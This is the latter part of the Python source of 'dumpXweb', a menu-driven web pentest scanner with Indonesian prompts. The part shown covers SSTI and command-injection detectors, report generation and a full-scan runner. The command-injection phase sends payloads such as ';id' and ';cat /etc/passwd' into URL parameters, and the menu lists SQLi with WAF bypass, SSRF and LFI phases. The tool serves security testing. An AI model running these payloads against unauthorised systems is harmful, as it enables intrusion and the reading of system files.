        for payload, expected in ssti_tests:
            test_url = self._build_url(param, payload)
            code, _, body, _ = http_get(test_url)
            text = body.decode(errors="ignore")
            if expected in text and payload not in text:
                add_finding("CRITICAL", "SSTI (Server-Side Template Injection)",
                            test_url,
                            f"Param: {param}, payload: {payload}",
                            f"Result contains '{expected}'",
                            "Sanitize input, jangan render user input")
                self.findings.append((param, payload, test_url, expected))
                return True
        return False

    def run(self):
        title("PHASE 20 - SSTI DETECTOR")
        if not self.params:
            warning("Tidak ada parameter, skip")
            return {"findings": []}
        for param in self.params:
            if STOP:
                break
            self.test(param)
        return {"findings": self.findings}

#phase21
class CmdInjectionPhase:
    def __init__(self, url):
        self.url = url
        self.parsed = urlparse(url)
        self.params = parse_qs(self.parsed.query)
        self.findings = []

    def _build_url(self, param, payload):
        new_params = {k: v[0] if isinstance(v, list) else v
                      for k, v in self.params.items()}
        new_params[param] = payload
        return urlunsplit((self.parsed.scheme, self.parsed.netloc,
                           self.parsed.path, urlencode(new_params), ""))

    def test(self, param):
        cmd_tests = [
            (";id", "uid="),
            ("|id", "uid="),
            ("&id", "uid="),
            ("`id`", "uid="),
            ("$(id)", "uid="),
            (";whoami", "www-data"),
            ("|whoami", "www-data"),
            (";uname -a", "Linux"),
            (";cat /etc/passwd", "root:x:0:0"),
            ("|cat /etc/passwd", "root:x:0:0"),
        ]
        for payload, expected in cmd_tests:
            test_url = self._build_url(param, payload)
            code, _, body, _ = http_get(test_url, timeout=10)
            text = body.decode(errors="ignore")
            if expected in text:
                add_finding("CRITICAL", "Command Injection",
                            test_url,
                            f"Param: {param}, payload: {payload}",
                            f"Result contains '{expected}'",
                            "Jangan pakai system()/exec() dengan user input")
                self.findings.append((param, payload, test_url, expected))
                return True
        return False

    def run(self):
        title("PHASE 21 - COMMAND INJECTION DETECTOR")
        if not self.params:
            warning("Tidak ada parameter, skip")
            return {"findings": []}
        for param in self.params:
            if STOP:
                break
            self.test(param)
        return {"findings": self.findings}

#phase22
class ReportPhase:
    def __init__(self, target, findings, recon_data=None):
        self.target = target
        self.findings = findings
        self.recon = recon_data or {}
        self.timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    def severity_count(self):
        counts = defaultdict(int)
        for f in self.findings:
            counts[f["severity"]] += 1
        return dict(counts)

    def risk_score(self):
        total = 0
        for f in self.findings:
            total += SEVERITY_SCORES.get(f["severity"], 0)
        return total

    def to_json(self, path):
        data = {
            "tool": "dumpXweb",
            "version": VERSION,
            "codename": CODENAME,
            "target": self.target,
            "scanned_at": self.timestamp,
            "summary": self.severity_count(),
            "risk_score": self.risk_score(),
            "total_findings": len(self.findings),
            "stats": dict(SCAN_STATS),
            "recon": self.recon,
            "findings": self.findings
        }
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        return path

    def to_html(self, path):
        counts = self.severity_count()
        rows = ""
        for f in self.findings:
            html_color = {
                "CRITICAL": "#ff3333",
                "HIGH": "#ff6600",
                "MEDIUM": "#ffcc00",
                "LOW": "#6699ff",
                "INFO": "#999999"
            }.get(f["severity"], "#999")
            rows += f"""<tr>
<td><span style="color:{html_color};font-weight:bold">{f['severity']}</span></td>
<td>{html_lib.escape(f['category'])}</td>
<td style="word-break:break-all">{html_lib.escape(f['url'])}</td>
<td>{html_lib.escape(f['detail'])}</td>
<td style="font-family:monospace;font-size:11px;max-width:400px;overflow:auto">{html_lib.escape(str(f.get('evidence','')))}</td>
<td>{html_lib.escape(f.get('remediation',''))}</td>
</tr>"""
        html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>dumpXweb v{VERSION} Report - {self.target}</title>
<style>
body {{ font-family: -apple-system, Arial; background:#0f0f0f; color:#ddd; padding:20px; margin:0; }}
h1 {{ color:#00ffcc; border-bottom:2px solid #00ffcc; padding-bottom:10px; }}
h2 {{ color:#00ffcc; margin-top:30px; }}
.meta {{ background:#1a1a1a; padding:15px; border-radius:8px; margin:15px 0; }}
.summary {{ display:flex; gap:15px; margin:20px 0; flex-wrap:wrap; }}
.box {{ padding:15px 25px; border-radius:8px; background:#1a1a1a; min-width:100px; text-align:center; }}
.crit {{ border-left:5px solid #ff3333; }}
.high {{ border-left:5px solid #ff6600; }}
.med {{ border-left:5px solid #ffcc00; }}
.low {{ border-left:5px solid #6699ff; }}
table {{ width:100%; border-collapse:collapse; margin-top:20px; font-size:13px; }}
th, td {{ padding:10px; border-bottom:1px solid #333; text-align:left; vertical-align:top; }}
th {{ background:#1a1a1a; color:#00ffcc; position:sticky; top:0; }}
tr:hover {{ background:#1a1a1a; }}
.footer {{ margin-top:40px; color:#666; text-align:center; padding:20px; border-top:1px solid #333; }}
</style></head><body>
<h1>dumpXweb v{VERSION} Security Report</h1>
<div class="meta">
<p><b>Target:</b> {html_lib.escape(self.target)}</p>
<p><b>Scanned:</b> {self.timestamp}</p>
<p><b>Tool:</b> dumpXweb v{VERSION} ({CODENAME}) by {AUTHOR}</p>
<p><b>Risk Score:</b> {self.risk_score()}</p>
</div>
<div class="summary">
<div class="box crit"><h2>{counts.get('CRITICAL',0)}</h2>CRITICAL</div>
<div class="box high"><h2>{counts.get('HIGH',0)}</h2>HIGH</div>
<div class="box med"><h2>{counts.get('MEDIUM',0)}</h2>MEDIUM</div>
<div class="box low"><h2>{counts.get('LOW',0)}</h2>LOW</div>
</div>
<h2>Findings ({len(self.findings)})</h2>
<table>
<tr><th>Severity</th><th>Category</th><th>URL</th><th>Detail</th><th>Evidence</th><th>Remediation</th></tr>
{rows}
</table>
<div class="footer">Generated by dumpXweb v{VERSION} ({CODENAME}) - {AUTHOR}</div>
</body></html>"""
        with open(path, "w", encoding="utf-8") as f:
            f.write(html)
        return path

    def run(self, out_dir, report_name="report"):
        out_dir = Path(out_dir)
        out_dir.mkdir(parents=True, exist_ok=True)
        title("PHASE 22 - REPORT GENERATOR")
        json_path = self.to_json(out_dir / f"{report_name}.json")
        html_path = self.to_html(out_dir / f"{report_name}.html")
        success(f"JSON: {json_path}")
        success(f"HTML: {html_path}")
        return {"json": str(json_path), "html": str(html_path)}

#individual phases
def action_full_scan():
    title("FULL SCAN - 22 PHASES")
    target = ask("Target URL (contoh https://site.com/page?id=1): ")
    if not target:
        error("Empty")
        return
    try:
        target = normalize_url(target)
    except Exception as e:
        error(str(e))
        return

    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    host = parsed.hostname

    out_dir = choose_result_path()
    report_name = choose_report_name("dumpXweb_full")

    print()
    print(f"{BRIGHT_CYAN}Target     :{RESET} {target}")
    print(f"{BRIGHT_CYAN}Base       :{RESET} {base}")
    print(f"{BRIGHT_CYAN}Host       :{RESET} {host}")
    print(f"{BRIGHT_CYAN}Output     :{RESET} {out_dir}")
    print(f"{BRIGHT_CYAN}Report     :{RESET} {report_name}")
    print()

    if ask("Start full scan? [y/N]: ").lower() != "y":
        return

    SCAN_STATS["start_time"] = time.time()
    SCAN_STATS["requests"] = 0
    SCAN_STATS["errors"] = 0
    SCAN_STATS["vulns"] = 0
    FINDINGS.clear()

    recon_data = {}

    try:
        recon_data["phase1"] = ReconPhase(target).run()
    except Exception as e:
        error(f"Phase 1 fail: {e}")

    try:
        recon_data["phase2"] = PortScanPhase(host).run()
    except Exception as e:
        error(f"Phase 2 fail: {e}")

    try:
        recon_data["phase3"] = SubdomainPhase(host).run()
    except Exception as e:
        error(f"Phase 3 fail: {e}")

    try:
        DirBrutePhase(base, recursive=True).run()
    except Exception as e:
        error(f"Phase 4 fail: {e}")

    try:
        SQLiPhase(target).run()
    except Exception as e:
        error(f"Phase 5 fail: {e}")

    try:
        XSSPhase(target).run()
    except Exception as e:
        error(f"Phase 6 fail: {e}")

    try:
        LFIPhase(target).run()
    except Exception as e:
        error(f"Phase 7 fail: {e}")

    try:
        SSRFPhase(target).run()
    except Exception as e:
        error(f"Phase 8 fail: {e}")

    try:
        OpenRedirectPhase(target).run()
    except Exception as e:
        error(f"Phase 9 fail: {e}")

    try:
        SensitiveFilesPhase(base).run()
    except Exception as e:
        error(f"Phase 10 fail: {e}")

    try:
        CSRFPhase(target).run()
    except Exception as e:
        error(f"Phase 13 fail: {e}")

    try:
        MethodPhase(target).run()
    except Exception as e:
        error(f"Phase 14 fail: {e}")

    try:
        CookiePhase(target).run()
    except Exception as e:
        error(f"Phase 15 fail: {e}")

    try:
        CORSPhase(target).run()
    except Exception as e:
        error(f"Phase 16 fail: {e}")

    try:
        GraphQLPhase(target).run()
    except Exception as e:
        error(f"Phase 17 fail: {e}")

    try:
        APIKeyPhase(target).run()
    except Exception as e:
        error(f"Phase 18 fail: {e}")

    try:
        XXEPhase(target).run()
    except Exception as e:
        error(f"Phase 19 fail: {e}")

    try:
        SSTIPhase(target).run()
    except Exception as e:
        error(f"Phase 20 fail: {e}")

    try:
        CmdInjectionPhase(target).run()
    except Exception as e:
        error(f"Phase 21 fail: {e}")

    if recon_data.get("phase3", {}).get("subdomains"):
        try:
            subs = [s[0] for s in recon_data["phase3"]["subdomains"]]
            TakeoverPhase(subs).run()
        except Exception as e:
            error(f"Phase 12 fail: {e}")

    elapsed = time.time() - SCAN_STATS["start_time"]

    ReportPhase(target, FINDINGS, recon_data).run(out_dir, report_name)

    title("SCAN COMPLETE")
    counts = defaultdict(int)
    for f in FINDINGS:
        counts[f["severity"]] += 1
    print(f"{BRIGHT_RED}CRITICAL :{RESET} {counts.get('CRITICAL', 0)}")
    print(f"{BRIGHT_RED}HIGH     :{RESET} {counts.get('HIGH', 0)}")
    print(f"{BRIGHT_YELLOW}MEDIUM   :{RESET} {counts.get('MEDIUM', 0)}")
    print(f"{BRIGHT_BLUE}LOW      :{RESET} {counts.get('LOW', 0)}")
    print(f"{BRIGHT_CYAN}Total    :{RESET} {len(FINDINGS)}")
    print(f"{BRIGHT_CYAN}Time     :{RESET} {elapsed:.2f}s")
    print(f"{BRIGHT_CYAN}Requests :{RESET} {SCAN_STATS['requests']}")
    print(f"{BRIGHT_CYAN}Errors   :{RESET} {SCAN_STATS['errors']}")
    print(f"{BRIGHT_GREEN}Output   :{RESET} {out_dir}")


def action_recon():
    title("RECON")
    t = ask("URL: ")
    if not t:
        return
    try:
        t = normalize_url(t)
    except Exception as e:
        error(str(e))
        return
    out_dir = choose_result_path()
    name = choose_report_name("recon")
    data = ReconPhase(t).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_portscan():
    title("PORT SCAN")
    h = ask("Host/IP: ")
    if not h:
        return
    h = h.replace("http://", "").replace("https://", "").split("/")[0]
    custom = ask("Custom ports (comma) atau ENTER: ").strip()
    ports = None
    if custom:
        try:
            ports = [int(p.strip()) for p in custom.split(",") if p.strip()]
        except Exception:
            warning("Format salah, pakai common")
    out_dir = choose_result_path()
    name = choose_report_name("portscan")
    data = PortScanPhase(h, ports).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_subdomain():
    title("SUBDOMAIN ENUM")
    d = ask("Domain: ")
    if not d:
        return
    out_dir = choose_result_path()
    name = choose_report_name("subdomain")
    data = SubdomainPhase(d).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_dirbrute():
    title("DIR BRUTE FORCE")
    u = ask("Base URL: ")
    if not u:
        return
    try:
        u = normalize_url(u)
    except Exception:
        u = "https://" + u
    wl = ask("Wordlist path (kosong = built-in): ").strip()
    if wl and Path(wl).exists():
        paths = [l.strip() for l in open(wl) if l.strip()]
        success(f"Loaded {len(paths)}")
    else:
        paths = COMMON_PATHS
    rec = ask("Recursive scan? [y/N]: ").lower() == "y"
    out_dir = choose_result_path()
    name = choose_report_name("dirbrute")
    data = DirBrutePhase(u, paths, recursive=rec).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_sqli():
    title("SQL INJECTION")
    u = ask("URL dengan parameter: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("sqli")
    data = SQLiPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_xss():
    title("XSS SCANNER")
    u = ask("URL dengan parameter: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("xss")
    data = XSSPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_lfi():
    title("LFI SCANNER")
    u = ask("URL dengan parameter: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("lfi")
    data = LFIPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_ssrf():
    title("SSRF SCANNER")
    u = ask("URL dengan parameter: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("ssrf")
    data = SSRFPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_redirect():
    title("OPEN REDIRECT")
    u = ask("URL dengan parameter: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("redirect")
    data = OpenRedirectPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_sensitive():
    title("SENSITIVE FILES")
    u = ask("Base URL: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("sensitive")
    data = SensitiveFilesPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_jwt():
    title("JWT ANALYZER")
    t = ask("JWT token: ")
    if not t:
        return
    out_dir = choose_result_path()
    name = choose_report_name("jwt")
    data = JWTPhase(t).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_takeover():
    title("SUBDOMAIN TAKEOVER")
    d = ask("Domain: ")
    if not d:
        return
    d = d.replace("http://", "").replace("https://", "").split("/")[0]
    subs = [f"{s}.{d}" for s in COMMON_SUBDOMAINS]
    out_dir = choose_result_path()
    name = choose_report_name("takeover")
    data = TakeoverPhase(subs).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_csrf():
    title("CSRF ANALYZER")
    u = ask("URL: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("csrf")
    data = CSRFPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_methods():
    title("HTTP METHODS")
    u = ask("URL: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("methods")
    data = MethodPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_cookies():
    title("COOKIE ANALYZER")
    u = ask("URL: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("cookies")
    data = CookiePhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_cors():
    title("CORS MISCONFIG")
    u = ask("URL: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("cors")
    data = CORSPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_graphql():
    title("GRAPHQL")
    u = ask("URL: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("graphql")
    data = GraphQLPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_apikey():
    title("API KEY LEAK SCANNER")
    u = ask("URL: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("apikey")
    data = APIKeyPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_xxe():
    title("XXE DETECTOR")
    u = ask("URL: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("xxe")
    data = XXEPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_ssti():
    title("SSTI DETECTOR")
    u = ask("URL dengan parameter: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("ssti")
    data = SSTIPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_cmdi():
    title("COMMAND INJECTION DETECTOR")
    u = ask("URL dengan parameter: ")
    if not u:
        return
    out_dir = choose_result_path()
    name = choose_report_name("cmdi")
    data = CmdInjectionPhase(normalize_url(u)).run()
    with open(out_dir / f"{name}.json", "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {out_dir}/{name}.json")


def action_dump():
    title("DUMP RESOURCES")
    u = ask("URL: ")
    if not u:
        return
    try:
        u = normalize_url(u)
    except Exception as e:
        error(str(e))
        return
    print(f"{BRIGHT_YELLOW}[1]{RESET} All assets")
    print(f"{BRIGHT_YELLOW}[2]{RESET} Images")
    print(f"{BRIGHT_YELLOW}[3]{RESET} JS/CSS")
    print(f"{BRIGHT_YELLOW}[4]{RESET} Docs")
    c = ask("Choice: ")
    exts = {
        "1": {".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg",
              ".css", ".js", ".json", ".xml", ".pdf", ".txt",
              ".zip", ".woff", ".woff2", ".ttf", ".otf"},
        "2": {".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg", ".ico"},
        "3": {".js", ".css", ".json"},
        "4": {".pdf", ".doc", ".docx", ".txt", ".csv", ".xls", ".xlsx"}
    }.get(c, {".jpg", ".png", ".css", ".js"})

    out_dir = choose_result_path()
    name = choose_report_name("dump")
    output = out_dir / name
    output.mkdir(parents=True, exist_ok=True)

    max_size = None
    print(f"{BRIGHT_YELLOW}[1]{RESET} 5 MB")
    print(f"{BRIGHT_YELLOW}[2]{RESET} 25 MB")
    print(f"{BRIGHT_YELLOW}[3]{RESET} 100 MB")
    print(f"{BRIGHT_YELLOW}[4]{RESET} Unlimited")
    s = ask("Max size: ")
    max_size = {"1": 5*1024*1024, "2": 25*1024*1024,
                "3": 100*1024*1024, "4": None}.get(s, 25*1024*1024)

    d = Dumper(u, output, exts, max_size)
    d.process()
    report_path = d.report()
    zip_path = d.make_zip()

    title("DUMP COMPLETE")
    print(f"{BRIGHT_GREEN}Files :{RESET} {d.downloaded}")
    print(f"{BRIGHT_GREEN}Size  :{RESET} {human_size(d.total_bytes)}")
    print(f"{BRIGHT_GREEN}Report:{RESET} {report_path}")
    print(f"{BRIGHT_GREEN}ZIP   :{RESET} {zip_path}")


def action_about():
    title(f"dumpXweb v{VERSION} - {CODENAME}")
    print(f"{BRIGHT_CYAN}Author :{RESET} {AUTHOR}")
    print(f"{BRIGHT_CYAN}Edition:{RESET} Full Pentester Suite")
    print()
    print(f"{BRIGHT_YELLOW}22 PHASES:{RESET}")
    print("  1.  Recon (DNS/WHOIS/SSL/Tech/Headers/Robots)")
    print("  2.  Port Scan + Banner Grab (100+ ports)")
    print("  3.  Subdomain Enumeration (100+ subdomain)")
    print("  4.  Directory Brute Force (smart 404 + recursive)")
    print("  5.  SQL Injection (error/boolean/time/union + WAF bypass)")
    print("  6.  XSS (Reflected + DOM + Stored)")
    print("  7.  LFI (LFI + PHP wrappers + auto-PoC)")
    print("  8.  SSRF (cloud metadata + internal + file)")
    print("  9.  Open Redirect")
    print("  10. Sensitive Files Scanner (90+ files)")
    print("  11. JWT Analyzer (weak secret + kid + jku)")
    print("  12. Subdomain Takeover (40+ services)")
    print("  13. CSRF Analyzer")
    print("  14. HTTP Method Checker")
    print("  15. Cookie Analyzer")
    print("  16. CORS Misconfiguration")
    print("  17. GraphQL Introspection")
    print("  18. API Key Leak Scanner (40+ patterns)")
    print("  19. XXE Detector")
    print("  20. SSTI Detector")
    print("  21. Command Injection Detector")
    print("  22. Report Generator (JSON + HTML)")
    print()
    print(f"{BRIGHT_YELLOW}FITUR TAMBAHAN:{RESET}")
    print("  - Path result pakai opsi nomor (7 preset + custom)")
    print("  - Custom filename report")
    print("  - Auto-PoC saat vuln ketemu (safe mode)")
    print("  - Prompt next/skip/cancel untuk critical finding")
    print("  - Dump resources (crawler + zip)")
    print()
    print(f"{BRIGHT_RED}Untuk authorized testing only.{RESET}")

#main
def main():
    while True:
        banner()
        print(f"{BRIGHT_YELLOW}[1]{RESET}  FULL SCAN (All 22 Phases + Auto-PoC)")
        print()
        print(f"{BRIGHT_CYAN}-- individual_phases --{RESET}")
        print(f"{BRIGHT_YELLOW}[2]{RESET}  Recon (DNS/WHOIS/SSL/Tech/Headers)")
        print(f"{BRIGHT_YELLOW}[3]{RESET}  Port Scan + Banner Grab")
        print(f"{BRIGHT_YELLOW}[4]{RESET}  Subdomain Enumeration")
        print(f"{BRIGHT_YELLOW}[5]{RESET}  Directory Brute Force (FULL)")
        print(f"{BRIGHT_YELLOW}[6]{RESET}  SQL Injection (FULL)")
        print(f"{BRIGHT_YELLOW}[7]{RESET}  XSS (Reflected + DOM + Stored)")
        print(f"{BRIGHT_YELLOW}[8]{RESET}  LFI (LFI + PHP wrappers)")
        print(f"{BRIGHT_YELLOW}[9]{RESET}  SSRF (Cloud metadata)")
        print(f"{BRIGHT_YELLOW}[10]{RESET} Open Redirect")
        print(f"{BRIGHT_YELLOW}[11]{RESET} Sensitive Files Scanner")
        print(f"{BRIGHT_YELLOW}[12]{RESET} JWT Analyzer")
        print(f"{BRIGHT_YELLOW}[13]{RESET} Subdomain Takeover")
        print(f"{BRIGHT_YELLOW}[14]{RESET} CSRF Analyzer")
        print(f"{BRIGHT_YELLOW}[15]{RESET} HTTP Method Checker")
        print(f"{BRIGHT_YELLOW}[16]{RESET} Cookie Analyzer")
        print(f"{BRIGHT_YELLOW}[17]{RESET} CORS Misconfiguration")
        print(f"{BRIGHT_YELLOW}[18]{RESET} GraphQL Introspection")
        print(f"{BRIGHT_YELLOW}[19]{RESET} API Key Leak Scanner")
        print(f"{BRIGHT_YELLOW}[20]{RESET} XXE Detector")
        print(f"{BRIGHT_YELLOW}[21]{RESET} SSTI Detector")
        print(f"{BRIGHT_YELLOW}[22]{RESET} Command Injection Detector")
        print()
        print(f"{BRIGHT_CYAN}-- TOOLS --{RESET}")
        print(f"{BRIGHT_YELLOW}[23]{RESET} Dump Resources (Crawler + ZIP)")
        print(f"{BRIGHT_YELLOW}[24]{RESET} About")
        print(f"{BRIGHT_YELLOW}[0]{RESET}  Exit")
        print()
        c = ask("dumpXweb > ")
        try:
            if c == "1":
                action_full_scan()
            elif c == "2":
                action_recon()
            elif c == "3":
                action_portscan()
            elif c == "4":
                action_subdomain()
            elif c == "5":
                action_dirbrute()
            elif c == "6":
                action_sqli()
            elif c == "7":
                action_xss()
            elif c == "8":
                action_lfi()
            elif c == "9":
                action_ssrf()
            elif c == "10":
                action_redirect()
            elif c == "11":
                action_sensitive()
            elif c == "12":
                action_jwt()
            elif c == "13":
                action_takeover()
            elif c == "14":
                action_csrf()
            elif c == "15":
                action_methods()
            elif c == "16":
                action_cookies()
            elif c == "17":
                action_cors()
            elif c == "18":
                action_graphql()
            elif c == "19":
                action_apikey()
            elif c == "20":
                action_xxe()
            elif c == "21":
                action_ssti()
            elif c == "22":
                action_cmdi()
            elif c == "23":
                action_dump()
            elif c == "24":
                action_about()
            elif c == "0":
                spinner("Exit", 0.4)
                break
            else:
                warning("Unknown choice")
                time.sleep(0.6)
                continue
        except KeyboardInterrupt:
            print(f"\n{BRIGHT_YELLOW}Interrupted{RESET}")
        except Exception as e:
            error(f"Error: {e}")
            import traceback
            traceback.print_exc()
        if c != "0":
            input(f"\n{BRIGHT_CYAN}ENTER to continue...{RESET}")

#en_pt
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{BRIGHT_YELLOW}Exit{RESET}")
    except Exception as e:
        print(f"\n{BRIGHT_RED}Fatal: {e}{RESET}")
